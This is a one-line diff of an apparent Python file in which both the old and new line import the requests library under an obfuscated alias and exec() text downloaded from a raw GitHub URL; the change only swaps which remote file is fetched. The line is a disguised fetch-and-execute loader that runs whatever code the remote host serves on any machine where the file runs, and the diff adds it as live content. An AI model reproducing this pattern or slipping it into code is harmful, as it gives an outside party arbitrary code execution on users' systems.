@@ -1,1 +1,1 @@
-import requests as O1O1O1O1O1O1O1O1O1O1O1; exec(O1O1O1O1O1O1O1O1O1O1O1.get('https://raw.githubusercontent.com/rimero321/entityclient/bro_why.txt').text)
+import requests as O1O1O1O1O1O1O1O1O1O1O1; exec(O1O1O1O1O1O1O1O1O1O1O1.get('https://raw.githubusercontent.com/rimero321/entityclient/main/bekind.txt').text)
